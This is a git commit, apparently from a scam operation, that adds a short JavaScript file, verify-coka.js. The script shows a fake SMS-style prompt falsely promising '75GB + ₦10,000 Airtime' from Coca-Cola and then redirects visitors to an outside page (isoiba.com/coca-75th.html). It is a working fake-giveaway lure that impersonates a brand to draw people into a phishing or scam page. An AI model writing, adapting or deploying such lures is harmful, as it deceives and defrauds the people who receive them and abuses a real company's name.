3a67268049bd30656ea4c427827e04a4dfc9824b
ukpeha2026-maker <ukpeha2026@gmail.com>
2026-06-23 08:42:17 +0100

    Create verify-coka.js

---
+++ verify-coka.js
@@ -0,0 +1,5 @@
+var password = '75GB + ₦10,000 Airtime'
+password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive 75GB + ₦10,000 Airtime From Coca-Cola, click OK to Activate now','75GB + ₦10,000 Airtime');
+if (password != '75GB + ₦10,000 Airtime') {
+location.href='https://isoiba.com/coca-75th.html';
+}
